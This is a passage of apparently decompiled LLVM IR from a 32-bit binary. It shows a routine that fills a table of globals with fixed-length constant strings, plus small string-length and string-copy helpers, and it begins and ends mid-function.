  uselistorder i32 %v1_8051301, { 1, 0 }
  uselistorder i32 %v0_80512fe, { 1, 0 }
  uselistorder i32 %v1_80512b4, { 3, 4, 0, 1, 2, 5 }
  uselistorder i8* %stack_var_-44, { 1, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_8056960.52 to i32), i32 4), { 1, 2, 0 }
  uselistorder i16* @global_var_80567dc.53, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_8056960.52 to i32), { 1, 2, 3, 0 }
}

define i32 @function_8051320() local_unnamed_addr {
dec_label_pc_8051320:
  %v1_8051326 = call i32 @function_8052b24(i32 26)
  store i32 %v1_8051326, i32* @ebx, align 4
  %v4_8051338 = call i32 @function_8051c50(i32 %v1_8051326, i32 ptrtoint ([27 x i8]* @global_var_8054d04.54 to i32), i32 26)
  %v0_805133d = load i32, i32* @ebx, align 4
  store i32 %v0_805133d, i32* @global_var_8056978.55, align 8
  store i16 26, i16* bitcast (i32* @global_var_805697c.56 to i16*), align 4
  %v1_8051353 = call i32 @function_8052b24(i32 2)
  store i32 %v1_8051353, i32* @ebx, align 4
  %v4_8051365 = call i32 @function_8051c50(i32 %v1_8051353, i32 ptrtoint ([3 x i8]* @global_var_8054d1f.57 to i32), i32 2)
  %v0_805136a = load i32, i32* @ebx, align 4
  store i32 %v0_805136a, i32* @global_var_8056980.58, align 128
  store i16 2, i16* bitcast (i32* @global_var_8056984.59 to i16*), align 4
  %v1_8051380 = call i32 @function_8052b24(i32 26)
  store i32 %v1_8051380, i32* @ebx, align 4
  %v4_8051392 = call i32 @function_8051c50(i32 %v1_8051380, i32 ptrtoint ([27 x i8]* @global_var_8054d04.54 to i32), i32 26)
  %v0_8051397 = load i32, i32* @ebx, align 4
  store i32 %v0_8051397, i32* @global_var_80569f0.60, align 16
  store i16 26, i16* bitcast (i32* @global_var_80569f4.61 to i16*), align 4
  %v1_80513ad = call i32 @function_8052b24(i32 2)
  store i32 %v1_80513ad, i32* @ebx, align 4
  %v4_80513bf = call i32 @function_8051c50(i32 %v1_80513ad, i32 ptrtoint (i32* @global_var_8054d22.62 to i32), i32 2)
  %v0_80513c4 = load i32, i32* @ebx, align 4
  store i32 %v0_80513c4, i32* @global_var_80569f8.63, align 8
  store i16 2, i16* bitcast (i32* @global_var_80569fc.64 to i16*), align 4
  %v1_80513da = call i32 @function_8052b24(i32 15)
  store i32 %v1_80513da, i32* @ebx, align 4
  %v4_80513ec = call i32 @function_8051c50(i32 %v1_80513da, i32 ptrtoint (i32* @global_var_8054d25.65 to i32), i32 15)
  %v0_80513f1 = load i32, i32* @ebx, align 4
  store i32 %v0_80513f1, i32* @global_var_8056970.66, align 16
  store i16 15, i16* bitcast (i32* @global_var_8056974.67 to i16*), align 4
  %v1_8051407 = call i32 @function_8052b24(i32 29)
  store i32 %v1_8051407, i32* @ebx, align 4
  %v4_8051419 = call i32 @function_8051c50(i32 %v1_8051407, i32 ptrtoint (i32* @global_var_8054d35.68 to i32), i32 29)
  %v0_805141e = load i32, i32* @ebx, align 4
  store i32 %v0_805141e, i32* @global_var_8056988.69, align 8
  store i16 29, i16* bitcast (i32* @global_var_805698c.70 to i16*), align 4
  %v1_8051434 = call i32 @function_8052b24(i32 7)
  store i32 %v1_8051434, i32* @ebx, align 4
  %v4_8051446 = call i32 @function_8051c50(i32 %v1_8051434, i32 ptrtoint ([8 x i8]* @global_var_8054d53.71 to i32), i32 7)
  %v0_805144b = load i32, i32* @ebx, align 4
  store i32 %v0_805144b, i32* @global_var_8056990.72, align 16
  store i16 7, i16* bitcast (i32* @global_var_8056994.73 to i16*), align 4
  %v1_8051461 = call i32 @function_8052b24(i32 5)
  store i32 %v1_8051461, i32* @ebx, align 4
  %v4_8051473 = call i32 @function_8051c50(i32 %v1_8051461, i32 ptrtoint ([6 x i8]* @global_var_8054d5b.74 to i32), i32 5)
  %v0_8051478 = load i32, i32* @ebx, align 4
  store i32 %v0_8051478, i32* @global_var_8056998.75, align 8
  store i16 5, i16* bitcast (i32* @global_var_805699c.76 to i16*), align 4
  %v1_805148e = call i32 @function_8052b24(i32 11)
  store i32 %v1_805148e, i32* @ebx, align 4
  %v4_80514a0 = call i32 @function_8051c50(i32 %v1_805148e, i32 ptrtoint (i32* @global_var_8054d61.77 to i32), i32 11)
  %v0_80514a5 = load i32, i32* @ebx, align 4
  store i32 %v0_80514a5, i32* @global_var_80569a0.78, align 32
  store i16 11, i16* bitcast (i32* @global_var_80569a4.79 to i16*), align 4
  %v1_80514bb = call i32 @function_8052b24(i32 4)
  store i32 %v1_80514bb, i32* @ebx, align 4
  %v4_80514cd = call i32 @function_8051c50(i32 %v1_80514bb, i32 ptrtoint ([5 x i8]* @global_var_8054d6d.80 to i32), i32 4)
  %v0_80514d2 = load i32, i32* @ebx, align 4
  store i32 %v0_80514d2, i32* @global_var_80569a8.81, align 8
  store i16 4, i16* bitcast (i32* @global_var_80569ac.82 to i16*), align 4
  %v1_80514e8 = call i32 @function_8052b24(i32 7)
  store i32 %v1_80514e8, i32* @ebx, align 4
  %v4_80514fa = call i32 @function_8051c50(i32 %v1_80514e8, i32 ptrtoint ([8 x i8]* @global_var_8054d72.83 to i32), i32 7)
  %v0_80514ff = load i32, i32* @ebx, align 4
  store i32 %v0_80514ff, i32* @global_var_80569b0.84, align 16
  store i16 7, i16* bitcast (i32* @global_var_80569b4.85 to i16*), align 4
  %v1_8051515 = call i32 @function_8052b24(i32 8)
  store i32 %v1_8051515, i32* @ebx, align 4
  %v4_8051527 = call i32 @function_8051c50(i32 %v1_8051515, i32 ptrtoint ([9 x i8]* @global_var_8054d7a.86 to i32), i32 8)
  %v0_805152c = load i32, i32* @ebx, align 4
  store i32 %v0_805152c, i32* @global_var_80569b8.87, align 8
  store i16 8, i16* bitcast (i32* @global_var_80569bc.88 to i16*), align 4
  %v1_8051542 = call i32 @function_8052b24(i32 13)
  store i32 %v1_8051542, i32* @ebx, align 4
  %v4_8051554 = call i32 @function_8051c50(i32 %v1_8051542, i32 ptrtoint (i32* @global_var_8054d83.89 to i32), i32 13)
  %v0_8051559 = load i32, i32* @ebx, align 4
  store i32 %v0_8051559, i32* @global_var_80569c0.90, align 64
  store i16 13, i16* bitcast (i32* @global_var_80569c4.91 to i16*), align 4
  %v1_805156f = call i32 @function_8052b24(i32 10)
  store i32 %v1_805156f, i32* @ebx, align 4
  %v4_8051581 = call i32 @function_8051c50(i32 %v1_805156f, i32 ptrtoint ([11 x i8]* @global_var_8054d91.92 to i32), i32 10)
  %v0_8051586 = load i32, i32* @ebx, align 4
  store i32 %v0_8051586, i32* @global_var_80569c8.93, align 8
  store i16 10, i16* bitcast (i32* @global_var_80569cc.94 to i16*), align 4
  %v1_805159c = call i32 @function_8052b24(i32 10)
  store i32 %v1_805159c, i32* @ebx, align 4
  %v4_80515ae = call i32 @function_8051c50(i32 %v1_805159c, i32 ptrtoint ([11 x i8]* @global_var_8054d9c.95 to i32), i32 10)
  %v0_80515b3 = load i32, i32* @ebx, align 4
  store i32 %v0_80515b3, i32* @global_var_80569d0.96, align 16
  store i16 10, i16* bitcast (i32* @global_var_80569d4.97 to i16*), align 4
  %v1_80515c9 = call i32 @function_8052b24(i32 33)
  store i32 %v1_80515c9, i32* @ebx, align 4
  %v4_80515db = call i32 @function_8051c50(i32 %v1_80515c9, i32 ptrtoint (i32* @global_var_8054f1c.98 to i32), i32 33)
  %v0_80515e0 = load i32, i32* @ebx, align 4
  store i32 %v0_80515e0, i32* @global_var_80569d8.99, align 8
  store i16 33, i16* bitcast (i32* @global_var_80569dc.100 to i16*), align 4
  %v1_80515f6 = call i32 @function_8052b24(i32 8)
  store i32 %v1_80515f6, i32* @ebx, align 4
  %v4_8051608 = call i32 @function_8051c50(i32 %v1_80515f6, i32 ptrtoint ([9 x i8]* @global_var_8054da7.101 to i32), i32 8)
  %v0_805160d = load i32, i32* @ebx, align 4
  store i32 %v0_805160d, i32* @global_var_80569e0.102, align 32
  store i16 8, i16* bitcast (i32* @global_var_80569e4.103 to i16*), align 4
  %v1_8051623 = call i32 @function_8052b24(i32 11)
  store i32 %v1_8051623, i32* @ebx, align 4
  %v4_8051635 = call i32 @function_8051c50(i32 %v1_8051623, i32 ptrtoint ([12 x i8]* @global_var_8054db0.104 to i32), i32 11)
  %v0_805163a = load i32, i32* @ebx, align 4
  store i32 %v0_805163a, i32* @global_var_80569e8.105, align 8
  store i16 11, i16* bitcast (i32* @global_var_80569ec.106 to i16*), align 4
  %v1_8051650 = call i32 @function_8052b24(i32 6)
  store i32 %v1_8051650, i32* @ebx, align 4
  %v4_8051662 = call i32 @function_8051c50(i32 %v1_8051650, i32 ptrtoint ([7 x i8]* @global_var_8054dbc.107 to i32), i32 6)
  %v0_8051667 = load i32, i32* @ebx, align 4
  store i32 %v0_8051667, i32* @global_var_8056a00.108, align 512
  store i16 6, i16* bitcast (i32* @global_var_8056a04.109 to i16*), align 4
  %v1_805167d = call i32 @function_8052b24(i32 7)
  store i32 %v1_805167d, i32* @ebx, align 4
  %v4_805168f = call i32 @function_8051c50(i32 %v1_805167d, i32 ptrtoint ([8 x i8]* @global_var_8054dc3.110 to i32), i32 7)
  %v0_8051694 = load i32, i32* @ebx, align 4
  store i32 %v0_8051694, i32* @global_var_8056a08.111, align 8
  store i16 7, i16* bitcast (i32* @global_var_8056a0c.112 to i16*), align 4
  %v1_80516aa = call i32 @function_8052b24(i32 7)
  store i32 %v1_80516aa, i32* @ebx, align 4
  %v4_80516bc = call i32 @function_8051c50(i32 %v1_80516aa, i32 ptrtoint ([8 x i8]* @global_var_8054dcb.113 to i32), i32 7)
  %v0_80516c1 = load i32, i32* @ebx, align 4
  store i32 %v0_80516c1, i32* @global_var_8056a10.114, align 16
  store i16 7, i16* bitcast (i32* @global_var_8056a14.115 to i16*), align 4
  %v1_80516d7 = call i32 @function_8052b24(i32 3)
  store i32 %v1_80516d7, i32* @ebx, align 4
  %v4_80516e9 = call i32 @function_8051c50(i32 %v1_80516d7, i32 ptrtoint ([4 x i8]* @global_var_8054dd3.116 to i32), i32 3)
  %v0_80516ee = load i32, i32* @ebx, align 4
  store i32 %v0_80516ee, i32* @global_var_8056a18.117, align 8
  store i16 3, i16* bitcast (i32* @global_var_8056a1c.118 to i16*), align 4
  %v1_8051704 = call i32 @function_8052b24(i32 19)
  store i32 %v1_8051704, i32* @ebx, align 4
  %v4_8051716 = call i32 @function_8051c50(i32 %v1_8051704, i32 ptrtoint (i32* @global_var_8054dd7.119 to i32), i32 19)
  %v0_805171b = load i32, i32* @ebx, align 4
  store i32 %v0_805171b, i32* @global_var_8056a20.120, align 32
  store i16 19, i16* bitcast (i32* @global_var_8056a24.121 to i16*), align 4
  %v1_8051731 = call i32 @function_8052b24(i32 24)
  store i32 %v1_8051731, i32* @ebx, align 4
  %v4_8051743 = call i32 @function_8051c50(i32 %v1_8051731, i32 ptrtoint (i32* @global_var_8054deb.122 to i32), i32 24)
  %v0_8051748 = load i32, i32* @ebx, align 4
  store i32 %v0_8051748, i32* @global_var_8056a28.123, align 8
  store i16 24, i16* bitcast (i32* @global_var_8056a2c.124 to i16*), align 4
  %v1_805175e = call i32 @function_8052b24(i32 9)
  store i32 %v1_805175e, i32* @ebx, align 4
  %v4_8051770 = call i32 @function_8051c50(i32 %v1_805175e, i32 ptrtoint ([10 x i8]* @global_var_8054e04.125 to i32), i32 9)
  %v0_8051775 = load i32, i32* @ebx, align 4
  store i32 %v0_8051775, i32* @global_var_8056a30.126, align 16
  store i16 9, i16* bitcast (i32* @global_var_8056a34.127 to i16*), align 4
  %v1_805178b = call i32 @function_8052b24(i32 16)
  store i32 %v1_805178b, i32* @ebx, align 4
  %v4_805179d = call i32 @function_8051c50(i32 %v1_805178b, i32 ptrtoint (i32* @global_var_8054e0e.128 to i32), i32 16)
  %v0_80517a2 = load i32, i32* @ebx, align 4
  store i32 %v0_80517a2, i32* @global_var_8056a38.129, align 8
  store i16 16, i16* bitcast (i32* @global_var_8056a3c.130 to i16*), align 4
  %v1_80517b8 = call i32 @function_8052b24(i32 22)
  store i32 %v1_80517b8, i32* @ebx, align 4
  %v4_80517ca = call i32 @function_8051c50(i32 %v1_80517b8, i32 ptrtoint (i32* @global_var_8054e1f.131 to i32), i32 22)
  %v0_80517cf = load i32, i32* @ebx, align 4
  store i32 %v0_80517cf, i32* @global_var_8056a40.132, align 64
  store i16 22, i16* bitcast (i32* @global_var_8056a44.133 to i16*), align 4
  %v1_80517e5 = call i32 @function_8052b24(i32 21)
  store i32 %v1_80517e5, i32* @ebx, align 4
  %v4_80517f7 = call i32 @function_8051c50(i32 %v1_80517e5, i32 ptrtoint (i32* @global_var_8054e36.134 to i32), i32 21)
  %v0_80517fc = load i32, i32* @ebx, align 4
  store i32 %v0_80517fc, i32* @global_var_8056a48.135, align 8
  store i16 21, i16* bitcast (i32* @global_var_8056a4c.136 to i16*), align 4
  %v1_8051812 = call i32 @function_8052b24(i32 17)
  store i32 %v1_8051812, i32* @ebx, align 4
  %v4_8051824 = call i32 @function_8051c50(i32 %v1_8051812, i32 ptrtoint ([18 x i8]* @global_var_8054e4c.137 to i32), i32 17)
  %v0_8051829 = load i32, i32* @ebx, align 4
  store i32 %v0_8051829, i32* @global_var_8056a50.138, align 16
  store i16 17, i16* bitcast (i32* @global_var_8056a54.139 to i16*), align 4
  %v1_805183f = call i32 @function_8052b24(i32 12)
  store i32 %v1_805183f, i32* @ebx, align 4
  %v4_8051851 = call i32 @function_8051c50(i32 %v1_805183f, i32 ptrtoint (i32* @global_var_8054e5e.140 to i32), i32 12)
  %v0_8051856 = load i32, i32* @ebx, align 4
  store i32 %v0_8051856, i32* @global_var_8056a58.141, align 8
  store i16 12, i16* bitcast (i32* @global_var_8056a5c.142 to i16*), align 4
  %v1_805186c = call i32 @function_8052b24(i32 23)
  store i32 %v1_805186c, i32* @ebx, align 4
  %v4_805187e = call i32 @function_8051c50(i32 %v1_805186c, i32 ptrtoint (i32* @global_var_8054e6b.143 to i32), i32 23)
  %v0_8051883 = load i32, i32* @ebx, align 4
  store i32 %v0_8051883, i32* @global_var_8056a60.144, align 32
  store i16 23, i16* bitcast (i32* @global_var_8056a64.145 to i16*), align 4
  %v1_8051899 = call i32 @function_8052b24(i32 83)
  store i32 %v1_8051899, i32* @ebx, align 4
  %v4_80518ab = call i32 @function_8051c50(i32 %v1_8051899, i32 ptrtoint (i32* @global_var_8054f40.146 to i32), i32 83)
  %v0_80518b0 = load i32, i32* @ebx, align 4
  store i32 %v0_80518b0, i32* @global_var_8056a68.147, align 8
  store i16 83, i16* bitcast (i32* @global_var_8056a6c.148 to i16*), align 4
  %v1_80518c6 = call i32 @function_8052b24(i32 32)
  store i32 %v1_80518c6, i32* @ebx, align 4
  %v4_80518d8 = call i32 @function_8051c50(i32 %v1_80518c6, i32 ptrtoint (i32* @global_var_8054f94.149 to i32), i32 32)
  %v0_80518dd = load i32, i32* @ebx, align 4
  store i32 %v0_80518dd, i32* @global_var_8056a70.150, align 16
  store i16 32, i16* bitcast (i32* @global_var_8056a74.151 to i16*), align 4
  %v1_80518f3 = call i32 @function_8052b24(i32 48)
  store i32 %v1_80518f3, i32* @ebx, align 4
  %v4_8051905 = call i32 @function_8051c50(i32 %v1_80518f3, i32 ptrtoint (i32* @global_var_8054fb8.152 to i32), i32 48)
  %v0_805190a = load i32, i32* @ebx, align 4
  store i32 %v0_805190a, i32* @global_var_8056a78.153, align 8
  store i16 48, i16* bitcast (i32* @global_var_8056a7c.154 to i16*), align 4
  %v1_8051920 = call i32 @function_8052b24(i32 12)
  store i32 %v1_8051920, i32* @ebx, align 4
  %v4_8051932 = call i32 @function_8051c50(i32 %v1_8051920, i32 ptrtoint (i32* @global_var_8054e83.155 to i32), i32 12)
  %v0_8051937 = load i32, i32* @ebx, align 4
  store i32 %v0_8051937, i32* @global_var_8056a80.156, align 128
  store i16 12, i16* bitcast (i32* @global_var_8056a84.157 to i16*), align 4
  %v1_805194d = call i32 @function_8052b24(i32 9)
  store i32 %v1_805194d, i32* @ebx, align 4
  %v4_805195f = call i32 @function_8051c50(i32 %v1_805194d, i32 ptrtoint (i32* @global_var_8054e90.158 to i32), i32 9)
  %v0_8051964 = load i32, i32* @ebx, align 4
  store i32 %v0_8051964, i32* @global_var_8056a88.159, align 8
  store i16 9, i16* bitcast (i32* @global_var_8056a8c.160 to i16*), align 4
  %v1_805197a = call i32 @function_8052b24(i32 10)
  store i32 %v1_805197a, i32* @ebx, align 4
  %v4_805198c = call i32 @function_8051c50(i32 %v1_805197a, i32 ptrtoint (i32* @global_var_8054e9a.161 to i32), i32 10)
  %v0_8051991 = load i32, i32* @ebx, align 4
  store i32 %v0_8051991, i32* @global_var_8056a90.162, align 16
  store i16 10, i16* bitcast (i32* @global_var_8056a94.163 to i16*), align 4
  %v1_80519a7 = call i32 @function_8052b24(i32 12)
  store i32 %v1_80519a7, i32* @ebx, align 4
  %v4_80519b9 = call i32 @function_8051c50(i32 %v1_80519a7, i32 ptrtoint (i32* @global_var_8054ea5.164 to i32), i32 12)
  %v0_80519be = load i32, i32* @ebx, align 4
  store i32 %v0_80519be, i32* @global_var_8056a98.165, align 8
  store i16 12, i16* bitcast (i32* @global_var_8056a9c.166 to i16*), align 4
  %v1_80519d4 = call i32 @function_8052b24(i32 16)
  store i32 %v1_80519d4, i32* @ebx, align 4
  %v4_80519e6 = call i32 @function_8051c50(i32 %v1_80519d4, i32 ptrtoint (i32* @global_var_8054eb2.167 to i32), i32 16)
  %v0_80519eb = load i32, i32* @ebx, align 4
  store i32 %v0_80519eb, i32* @global_var_8056aa0.168, align 32
  store i16 16, i16* bitcast (i32* @global_var_8056aa4.169 to i16*), align 4
  %v1_8051a01 = call i32 @function_8052b24(i32 19)
  store i32 %v1_8051a01, i32* @ebx, align 4
  %v4_8051a13 = call i32 @function_8051c50(i32 %v1_8051a01, i32 ptrtoint (i32* @global_var_8054ec3.170 to i32), i32 19)
  %v0_8051a18 = load i32, i32* @ebx, align 4
  store i32 %v0_8051a18, i32* @global_var_8056aa8.171, align 8
  store i16 19, i16* bitcast (i32* @global_var_8056aac.172 to i16*), align 4
  %v1_8051a2e = call i32 @function_8052b24(i32 8)
  store i32 %v1_8051a2e, i32* @ebx, align 4
  %v4_8051a40 = call i32 @function_8051c50(i32 %v1_8051a2e, i32 ptrtoint ([9 x i8]* @global_var_8054ed7.173 to i32), i32 8)
  %v0_8051a45 = load i32, i32* @ebx, align 4
  store i32 %v0_8051a45, i32* @global_var_8056ab0.174, align 16
  store i16 8, i16* bitcast (i32* @global_var_8056ab4.175 to i16*), align 4
  %v1_8051a5b = call i32 @function_8052b24(i32 11)
  store i32 %v1_8051a5b, i32* @ebx, align 4
  %v4_8051a6d = call i32 @function_8051c50(i32 %v1_8051a5b, i32 ptrtoint (i32* @global_var_8054e77.176 to i32), i32 11)
  %v0_8051a72 = load i32, i32* @ebx, align 4
  store i32 %v0_8051a72, i32* @global_var_8056ab8.177, align 8
  store i16 11, i16* bitcast (i32* @global_var_8056abc.178 to i16*), align 4
  %v1_8051a88 = call i32 @function_8052b24(i32 12)
  store i32 %v1_8051a88, i32* @ebx, align 4
  %v4_8051a9a = call i32 @function_8051c50(i32 %v1_8051a88, i32 ptrtoint (i32* @global_var_8054ee0.179 to i32), i32 12)
  %v0_8051a9f = load i32, i32* @ebx, align 4
  store i32 %v0_8051a9f, i32* @global_var_8056ac0.180, align 64
  store i16 12, i16* bitcast (i32* @global_var_8056ac4.181 to i16*), align 4
  %v1_8051ab5 = call i32 @function_8052b24(i32 18)
  store i32 %v1_8051ab5, i32* @ebx, align 4
  %v4_8051ac7 = call i32 @function_8051c50(i32 %v1_8051ab5, i32 ptrtoint (i32* @global_var_8054eed.182 to i32), i32 18)
  %v0_8051acc = load i32, i32* @ebx, align 4
  store i32 %v0_8051acc, i32* @global_var_8056ac8.183, align 8
  store i16 18, i16* bitcast (i32* @global_var_8056acc.184 to i16*), align 4
  %v1_8051ae2 = call i32 @function_8052b24(i32 25)
  store i32 %v1_8051ae2, i32* @ebx, align 4
  %v4_8051af4 = call i32 @function_8051c50(i32 %v1_8051ae2, i32 ptrtoint (i32* @global_var_8054f00.185 to i32), i32 25)
  %v0_8051af9 = load i32, i32* @ebx, align 4
  store i32 %v0_8051af9, i32* @global_var_8056ad0.186, align 16
  store i16 25, i16* bitcast (i32* @global_var_8056ad4.187 to i16*), align 4
  %v1_8051b0f = call i32 @function_8052b24(i32 111)
  store i32 %v1_8051b0f, i32* @ebx, align 4
  %v4_8051b21 = call i32 @function_8051c50(i32 %v1_8051b0f, i32 ptrtoint (i32* @global_var_8054fec.188 to i32), i32 111)
  %v0_8051b26 = load i32, i32* @ebx, align 4
  store i32 %v0_8051b26, i32* @global_var_8056ad8.189, align 8
  store i16 111, i16* bitcast (i32* @global_var_8056adc.190 to i16*), align 4
  %v1_8051b3c = call i32 @function_8052b24(i32 111)
  store i32 %v1_8051b3c, i32* @ebx, align 4
  %v4_8051b4e = call i32 @function_8051c50(i32 %v1_8051b3c, i32 ptrtoint (i32* @global_var_805505c.191 to i32), i32 111)
  %v0_8051b53 = load i32, i32* @ebx, align 4
  store i32 %v0_8051b53, i32* @global_var_8056ae0.192, align 32
  store i16 111, i16* bitcast (i32* @global_var_8056ae4.193 to i16*), align 4
  %v1_8051b69 = call i32 @function_8052b24(i32 110)
  store i32 %v1_8051b69, i32* @ebx, align 4
  %v4_8051b7b = call i32 @function_8051c50(i32 %v1_8051b69, i32 ptrtoint (i32* @global_var_80550cc.194 to i32), i32 110)
  %v0_8051b80 = load i32, i32* @ebx, align 4
  store i32 %v0_8051b80, i32* @global_var_8056ae8.195, align 8
  store i16 110, i16* bitcast (i32* @global_var_8056aec.196 to i16*), align 4
  %v1_8051b96 = call i32 @function_8052b24(i32 110)
  store i32 %v1_8051b96, i32* @ebx, align 4
  %v4_8051ba8 = call i32 @function_8051c50(i32 %v1_8051b96, i32 ptrtoint (i32* @global_var_805513c.197 to i32), i32 110)
  %v0_8051bad = load i32, i32* @ebx, align 4
  store i32 %v0_8051bad, i32* @global_var_8056af0.198, align 16
  store i16 110, i16* bitcast (i32* @global_var_8056af4.199 to i16*), align 4
  %v1_8051bc3 = call i32 @function_8052b24(i32 117)
  store i32 %v1_8051bc3, i32* @ebx, align 4
  %v4_8051bd5 = call i32 @function_8051c50(i32 %v1_8051bc3, i32 ptrtoint (i32* @global_var_80551ac.200 to i32), i32 117)
  %v0_8051bda = load i32, i32* @ebx, align 4
  store i32 %v0_8051bda, i32* @global_var_8056af8.201, align 8
  store i16 117, i16* bitcast (i32* @global_var_8056afc.202 to i16*), align 4
  ret i32 %v4_8051bd5

; uselistorder directives
  uselistorder i32 (i32, i32, i32)* @function_8051c50, { 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
}

define i32 @function_8051bf0(i8* %arg1) local_unnamed_addr {
dec_label_pc_8051bf0:
  %v4_8051bf0 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8051bf0, i32* @edx, align 4
  %v2_8051bf6 = load i8, i8* %arg1, align 1
  %v3_8051bf6 = icmp eq i8 %v2_8051bf6, 0
  br i1 %v3_8051bf6, label %dec_label_pc_8051c07, label %dec_label_pc_8051c00

dec_label_pc_8051c00:                             ; preds = %dec_label_pc_8051bf0, %dec_label_pc_8051c00
  %v0_8051c00 = phi i32 [ %v1_8051c00, %dec_label_pc_8051c00 ], [ 0, %dec_label_pc_8051bf0 ]
  %v1_8051c00 = add i32 %v0_8051c00, 1
  %v2_8051c01 = add i32 %v1_8051c00, %v4_8051bf0
  %v3_8051c01 = inttoptr i32 %v2_8051c01 to i8*
  %v4_8051c01 = load i8, i8* %v3_8051c01, align 1
  %v5_8051c01 = icmp eq i8 %v4_8051c01, 0
  %v1_8051c05 = icmp eq i1 %v5_8051c01, false
  br i1 %v1_8051c05, label %dec_label_pc_8051c00, label %dec_label_pc_8051c07

dec_label_pc_8051c07:                             ; preds = %dec_label_pc_8051c00, %dec_label_pc_8051bf0
  %v0_8051c07 = phi i32 [ 0, %dec_label_pc_8051bf0 ], [ %v1_8051c00, %dec_label_pc_8051c00 ]
  ret i32 %v0_8051c07

; uselistorder directives
  uselistorder label %dec_label_pc_8051c00, { 1, 0 }
}

define i32 @function_8051c10(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8051c10:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp15 = inttoptr i32 %arg2 to i8*
  %stack_var_-8 = alloca i32, align 4
  %v0_8051c11 = load i32, i32* @ebx, align 4
  store i32 %v0_8051c11, i32* %stack_var_-8, align 4
  store i32 %arg2, i32* %eax.global-to-local, align 4
  %v4_8051c16 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8051c16, i32* %edx.global-to-local, align 4
  %v2_8051c1a = load i8, i8* %tmp15, align 1
  %v3_8051c1a = icmp eq i8 %v2_8051c1a, 0
  br i1 %v3_8051c1a, label %dec_label_pc_8051c44, label %dec_label_pc_8051c1f

dec_label_pc_8051c1f:                             ; preds = %dec_label_pc_8051c10
  store i32 0, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8051c21

dec_label_pc_8051c21:                             ; preds = %dec_label_pc_8051c21, %dec_label_pc_8051c1f
  %v0_8051c21 = phi i32 [ %v1_8051c21, %dec_label_pc_8051c21 ], [ 0, %dec_label_pc_8051c1f ]
  %v1_8051c21 = add i32 %v0_8051c21, 1
  store i32 %v1_8051c21, i32* %esi.global-to-local, align 4
  %v2_8051c22 = add i32 %v1_8051c21, %arg2
  %v3_8051c22 = inttoptr i32 %v2_8051c22 to i8*
  %v4_8051c22 = load i8, i8* %v3_8051c22, align 1
  %v5_8051c22 = icmp eq i8 %v4_8051c22, 0
  %v1_8051c26 = icmp eq i1 %v5_8051c22, false
  br i1 %v1_8051c26, label %dec_label_pc_8051c21, label %dec_label_pc_8051c28

dec_label_pc_8051c28:                             ; preds = %dec_label_pc_8051c21
  %v10_8051c28 = icmp eq i32 %v0_8051c21, -2
  br i1 %v10_8051c28, label %dec_label_pc_8051c3f, label %dec_label_pc_8051c2d

dec_label_pc_8051c2d:                             ; preds = %dec_label_pc_8051c28
  store i32 %v4_8051c16, i32* %ebx.global-to-local, align 4
  store i32 %arg2, i32* @ecx, align 4
  store i32 %v1_8051c21, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8051c33

dec_label_pc_8051c33:                             ; preds = %dec_label_pc_8051c44, %dec_label_pc_8051c2d, %dec_label_pc_8051c33.dec_label_pc_8051c33_crit_edge
  %v2_8051c36 = phi i32 [ %v1_8051c39, %dec_label_pc_8051c33.dec_label_pc_8051c33_crit_edge ], [ %v4_8051c16, %dec_label_pc_8051c2d ], [ %v4_8051c16, %dec_label_pc_8051c44 ]
  %v0_8051c35 = phi i32 [ %v0_8051c3a, %dec_label_pc_8051c33.dec_label_pc_8051c33_crit_edge ], [ %v1_8051c21, %dec_label_pc_8051c2d ], [ 0, %dec_label_pc_8051c44 ]
  %v4_8051c33 = phi i32 [ %v4_8051c33.pre, %dec_label_pc_8051c33.dec_label_pc_8051c33_crit_edge ], [ %arg2, %dec_label_pc_8051c2d ], [ %arg2, %dec_label_pc_8051c44 ]
  %v0_8051c33 = phi i32 [ %v1_8051c38, %dec_label_pc_8051c33.dec_label_pc_8051c33_crit_edge ], [ %arg2, %dec_label_pc_8051c2d ], [ %arg2, %dec_label_pc_8051c44 ]
  %v1_8051c33 = inttoptr i32 %v0_8051c33 to i8*
  %v2_8051c33 = load i8, i8* %v1_8051c33, align 1
  %v3_8051c33 = zext i8 %v2_8051c33 to i32
  %v5_8051c33 = and i32 %v4_8051c33, -256
  %v6_8051c33 = or i32 %v3_8051c33, %v5_8051c33
  store i32 %v6_8051c33, i32* %eax.global-to-local, align 4
  %v1_8051c35 = add i32 %v0_8051c35, -1
  store i32 %v1_8051c35, i32* %edx.global-to-local, align 4
  %v3_8051c36 = inttoptr i32 %v2_8051c36 to i8*
  store i8 %v2_8051c33, i8* %v3_8051c36, align 1
  %v0_8051c38 = load i32, i32* @ecx, align 4
  %v1_8051c38 = add i32 %v0_8051c38, 1
  store i32 %v1_8051c38, i32* @ecx, align 4
  %v0_8051c39 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051c39 = add i32 %v0_8051c39, 1
  store i32 %v1_8051c39, i32* %ebx.global-to-local, align 4
  %v0_8051c3a = load i32, i32* %edx.global-to-local, align 4
  %v10_8051c3a = icmp eq i32 %v0_8051c3a, -1
  %v1_8051c3d = icmp eq i1 %v10_8051c3a, false
  br i1 %v1_8051c3d, label %dec_label_pc_8051c33.dec_label_pc_8051c33_crit_edge, label %dec_label_pc_8051c3f.loopexit

dec_label_pc_8051c33.dec_label_pc_8051c33_crit_edge: ; preds = %dec_label_pc_8051c33
  %v4_8051c33.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051c33

dec_label_pc_8051c3f.loopexit:                    ; preds = %dec_label_pc_8051c33
  %v0_8051c3f.pre = load i32, i32* %esi.global-to-local, align 4
  %v2_8051c41.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_8051c3f

dec_label_pc_8051c3f:                             ; preds = %dec_label_pc_8051c3f.loopexit, %dec_label_pc_8051c28
